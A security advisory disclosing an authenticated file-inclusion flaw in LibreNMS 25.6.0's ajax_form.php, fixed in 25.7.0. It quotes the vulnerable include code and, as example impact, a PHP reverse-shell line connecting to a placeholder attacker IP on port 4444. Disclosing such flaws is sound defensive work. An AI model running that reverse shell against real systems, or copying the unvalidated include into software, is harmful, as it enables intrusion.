# Authenticated Remote File Inclusion in `ajax_form.php` Allows RCE

#### CVE ID: Pending

#### Date: 2025-07-16

#### Author: Seth Kraft

#### Vendor Homepage: https://www.librenms.org/

#### Vendor Changelog: https://github.com/librenms/librenms/releases

#### Affected Version: 25.6.0

#### Fixed Version: 25.7.0 via [PR-17990](https://github.com/librenms/librenms/pull/17990)

#### CWE ID: [`CWE-98`](https://cwe.mitre.org/data/definitions/98.html) (Improper Control of Filename for Include/Require Statement in PHP Program)

#### Estimated CVSS Base Score: 7.5 (High)

#### Estimated Vector String: `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H`

#### Type: Authenticated Local File Inclusion

---

## Authorization

**For authorized testing and research purposes only.** Do not test or exploit this vulnerability on systems you do not own or have explicit permission to test.

---

## Summary

LibreNMS 25.6.0 contains an architectural vulnerability in the `ajax_form.php` endpoint that permits Local File Inclusion (LFI) based on user-controlled POST input. 

The application directly uses the `type` parameter to dynamically include `.inc.php` files from the trusted path `includes/html/forms/`, without validation or allowlisting:

```php
if (file_exists('includes/html/forms/' . $_POST['type'] . '.inc.php')) {
    include_once 'includes/html/forms/' . $_POST['type'] . '.inc.php';
}
```
This pattern introduces a latent Remote Code Execution (RCE) vector if an attacker can stage a file in this include path — for example, via symlink, development misconfiguration, or chained vulnerabilities.

>  This is not an arbitrary file upload bug. But it does provide a powerful execution sink for attackers with write access (direct or indirect) to the include directory.

---

## Conditions for Exploitation

- Attacker must be authenticated    
- Attacker must control a file at `includes/html/forms/{type}.inc.php` (or symlink)        

## Example Impact (RCE)

If a PHP file or symlinked shell is staged in the include path, an attacker can achieve full remote code execution under the `librenms` user context:

```php
<?php system('/bin/bash -c "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1"'); ?>
```

![Screen Recording 2025-06-25 212722](https://github.com/user-attachments/assets/9638d4b4-bfd6-4ace-8af1-8990c6736bc8)

---

## Solution

Upgrade to Version 25.7.0

## Disclaimer
This work was conducted outside of my employment and reflects my personal efforts in cybersecurity research.

---
